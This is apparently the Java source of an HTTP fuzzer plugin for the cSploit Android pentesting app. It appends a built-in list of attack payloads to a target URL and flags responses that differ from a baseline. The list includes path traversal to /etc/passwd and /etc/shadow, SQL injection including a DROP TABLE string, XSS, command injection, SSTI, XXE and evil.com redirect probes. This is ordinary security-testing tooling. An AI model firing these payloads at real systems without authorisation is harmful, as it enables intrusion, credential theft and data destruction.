package org.csploit.android.plugins;

import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.core.content.ContextCompat;

import com.google.android.material.floatingactionbutton.FloatingActionButton;

import org.csploit.android.BuildConfig;
import org.csploit.android.R;
import org.csploit.android.core.Plugin;
import org.csploit.android.core.System;
import org.csploit.android.helpers.AnimationHelper;
import org.csploit.android.helpers.LoggingHelper;
import org.csploit.android.helpers.ThreadHelper;
import org.csploit.android.net.Target;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * HTTP Fuzzer — appends common attack payloads to a URL path/parameter and
 * flags responses that differ from the baseline (different status code or
 * significantly different response size).
 *
 * Payload categories:
 *   - Path traversal / LFI  (../etc/passwd)
 *   - SQL injection          (' OR 1=1--, UNION SELECT, etc.)
 *   - XSS probes             (<script>, javascript:)
 *   - Command injection      (; ls, | id, `whoami`)
 *   - Sensitive file names   (.git, .env, backup.zip, etc.)
 *   - Admin paths            (/admin, /wp-admin, /manager)
 */
public class HttpFuzzer extends Plugin {
    private static final String TAG = "HttpFuzzer";
    private static final int TIMEOUT_MS = 5000;

    private static final String[] PAYLOADS = {
        // Path traversal / LFI
        "../etc/passwd", "../../etc/passwd", "../../../etc/shadow",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        // SQL injection
        "'", "''", "' OR '1'='1", "' OR 1=1--", "1' OR '1'='1'--",
        "\" OR \"1\"=\"1", "1 UNION SELECT NULL--", "1; DROP TABLE users--",
        "' AND SLEEP(3)--", "1 AND 1=1", "1 AND 1=2",
        // XSS
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "'><script>alert(1)</script>",
        // Command injection
        "; ls -la", "| id", "`whoami`", "$(id)", "&& cat /etc/passwd",
        // SSTI
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        // XXE probe
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        // Open redirect
        "//evil.com", "https://evil.com", "/\\evil.com",
        // Sensitive paths
        ".git/HEAD", ".env", "config.php", "web.config", "backup.zip",
        "dump.sql", "database.sql", ".htpasswd", "id_rsa",
        // Admin paths
        "admin/", "administrator/", "wp-admin/", "manager/", "phpmyadmin/",
        "console/", "dashboard/", "portal/",
    };

    public static class FuzzResult {
        public enum Severity { BASELINE, INTERESTING, WARN }
        public final Severity severity;
        public final String payload;
        public final int status;
        public final int size;
        public final String note;
        FuzzResult(Severity s, String payload, int status, int size, String note) {
            this.severity = s; this.payload = payload;
            this.status = status; this.size = size; this.note = note;
        }
    }

    private FloatingActionButton mToggleButton;
    private ProgressBar mProgress;
    private ListView mListView;
    private ResultAdapter mAdapter;
    private EditText mUrlInput;
    private final AtomicBoolean mRunning = new AtomicBoolean(false);
    private Future<?> mJob;

    public HttpFuzzer() {
        super(
            R.string.http_fuzzer,
            R.string.http_fuzzer_desc,
            new Target.Type[]{Target.Type.ENDPOINT, Target.Type.REMOTE},
            R.layout.plugin_http_fuzzer,
            R.drawable.action_exploit_finder
        );
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        SharedPreferences prefs = getSharedPreferences("THEME", 0);
        setTheme(prefs.getBoolean("isDark", false) ? R.style.DarkTheme : R.style.AppTheme);
        super.onCreate(savedInstanceState);

        mToggleButton = findViewById(R.id.fuzzToggleButton);
        mProgress     = findViewById(R.id.fuzzActivity);
        mListView     = findViewById(android.R.id.list);
        mUrlInput     = findViewById(R.id.fuzzUrlInput);
        mAdapter      = new ResultAdapter();
        mListView.setAdapter(mAdapter);

        // Pre-fill URL from target
        Target t = System.getCurrentTarget();
        if (t != null) {
            String ip = t.getAddress().getHostAddress();
            mUrlInput.setText("http://" + ip + "/");
        }

        mToggleButton.setOnClickListener(v -> {
            if (mRunning.get()) stopFuzz();
            else                startFuzz();
        });
    }

    @Override
    public void onBackPressed() {
        stopFuzz();
        super.onBackPressed();
        overridePendingTransition(R.anim.fadeout, R.anim.fadein);
    }

    // ── Fuzz control ──────────────────────────────────────────────────────────

    private void startFuzz() {
        final String baseUrl = mUrlInput.getText().toString().trim();
        if (baseUrl.isEmpty()) return;

        mRunning.set(true);
        mAdapter.clear();
        mProgress.setVisibility(View.VISIBLE);
        mProgress.setMax(PAYLOADS.length + 1);
        mProgress.setProgress(0);
        AnimationHelper.fadeIn(mProgress, 200);
        mToggleButton.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_stop_24dp));

        if (BuildConfig.DEBUG) {
            mJob = ThreadHelper.submit(() -> {
                emitDebugResults(baseUrl);
                runOnUiThread(this::onFuzzFinished);
            });
            return;
        }

        mJob = ThreadHelper.submit(() -> {
            fuzz(baseUrl);
            runOnUiThread(this::onFuzzFinished);
        });
    }

    private void stopFuzz() {
        mRunning.set(false);
        if (mJob != null) { mJob.cancel(true); mJob = null; }
        onFuzzFinished();
    }

    private void onFuzzFinished() {
        mRunning.set(false);
        AnimationHelper.fadeOut(mProgress, 200, () -> mProgress.setVisibility(View.INVISIBLE));
        mToggleButton.setImageDrawable(ContextCompat.getDrawable(this, R.drawable.ic_play_arrow_24dp));
    }

    // ── Fuzz logic ────────────────────────────────────────────────────────────

    private void fuzz(String baseUrl) {
        // 1. Baseline request
        int[] baseline = probe(baseUrl);
        if (baseline == null) {
            report(new FuzzResult(FuzzResult.Severity.WARN, "(baseline)", 0, 0, "Cannot connect to target"));
            return;
        }
        report(new FuzzResult(FuzzResult.Severity.BASELINE, "BASELINE", baseline[0], baseline[1],
            "status=" + baseline[0] + " size=" + baseline[1]));
        runOnUiThread(() -> mProgress.setProgress(1));

        final AtomicInteger done = new AtomicInteger(1);
        // 2. Fuzz each payload
        for (String payload : PAYLOADS) {
            if (!mRunning.get()) break;
            try {
                String url = baseUrl.endsWith("/") ? baseUrl + payload : baseUrl + "/" + payload;
                int[] res = probe(url);
                if (res == null) continue;

                FuzzResult.Severity sev = FuzzResult.Severity.BASELINE;
                String note = "status=" + res[0] + " size=" + res[1];

                if (res[0] == 200 && baseline[0] != 200) {
                    sev = FuzzResult.Severity.WARN;
                    note += " ← unexpected 200";
                } else if (res[0] != baseline[0] && res[0] != 404 && res[0] != 400) {
                    sev = FuzzResult.Severity.INTERESTING;
                    note += " ← status differs from baseline";
                } else if (Math.abs(res[1] - baseline[1]) > 500 && res[0] == baseline[0]) {
                    sev = FuzzResult.Severity.INTERESTING;
                    note += " ← size anomaly";
                }

                if (sev != FuzzResult.Severity.BASELINE)
                    report(new FuzzResult(sev, payload, res[0], res[1], note));

            } catch (Exception ignored) {}
            final int d = done.incrementAndGet();
            runOnUiThread(() -> mProgress.setProgress(d));
        }

        if (mAdapter.getCount() <= 1)
            report(new FuzzResult(FuzzResult.Severity.BASELINE, "(done)", 0, 0, "No anomalies detected"));
    }

    /** Returns [statusCode, responseBodySize] or null on connection error. */
    private int[] probe(String urlStr) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(TIMEOUT_MS);
            conn.setReadTimeout(TIMEOUT_MS);
            conn.setInstanceFollowRedirects(false);
            int code = conn.getResponseCode();
            // Read response to get size
            InputStream is = code < 400 ? conn.getInputStream() : conn.getErrorStream();
            int size = 0;
            if (is != null) {
                byte[] buf = new byte[4096];
                int n;
                while ((n = is.read(buf)) >= 0) size += n;
                is.close();
            }
            conn.disconnect();
            return new int[]{code, size};
        } catch (Exception e) {
            return null;
        }
    }

    // ── Debug helpers ─────────────────────────────────────────────────────────

    private void emitDebugResults(String base) {
        report(new FuzzResult(FuzzResult.Severity.BASELINE,   "BASELINE",            200, 4096, "status=200 size=4096"));
        report(new FuzzResult(FuzzResult.Severity.WARN,       ".git/HEAD",           200,   23, "status=200 size=23 ← unexpected 200"));
        report(new FuzzResult(FuzzResult.Severity.WARN,       ".env",                200,  312, "status=200 size=312 ← unexpected 200"));
        report(new FuzzResult(FuzzResult.Severity.WARN,       "' OR 1=1--",          500,  128, "status=500 ← status differs from baseline"));
        report(new FuzzResult(FuzzResult.Severity.INTERESTING,"../etc/passwd",       200, 2048, "status=200 size=2048 ← size anomaly"));
        report(new FuzzResult(FuzzResult.Severity.INTERESTING,"{{7*7}}",             200, 4208, "status=200 size=4208 ← size anomaly"));
        report(new FuzzResult(FuzzResult.Severity.BASELINE,   "(done)",                0,    0, "Scan complete"));
    }

    // ── UI helpers ────────────────────────────────────────────────────────────

    private void report(FuzzResult r) {
        runOnUiThread(() -> {
            mAdapter.add(r);
            mAdapter.notifyDataSetChanged();
        });
    }

    private class ResultAdapter extends ArrayAdapter<FuzzResult> {
        ResultAdapter() {
            super(HttpFuzzer.this, R.layout.plugin_http_fuzzer_item, new ArrayList<>());
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            if (convertView == null)
                convertView = LayoutInflater.from(getContext())
                    .inflate(R.layout.plugin_http_fuzzer_item, parent, false);

            FuzzResult r = getItem(position);
            TextView tvPayload = convertView.findViewById(R.id.fuzzItemPayload);
            TextView tvNote    = convertView.findViewById(R.id.fuzzItemNote);

            tvPayload.setText(r.payload);
            tvNote.setText(r.note);

            int color;
            switch (r.severity) {
                case WARN:        color = Color.parseColor("#D32F2F"); break;
                case INTERESTING: color = Color.parseColor("#F57C00"); break;
                default:          color = Color.parseColor("#757575"); break;
            }
            tvPayload.setTextColor(color);
            return convertView;
        }
    }
}
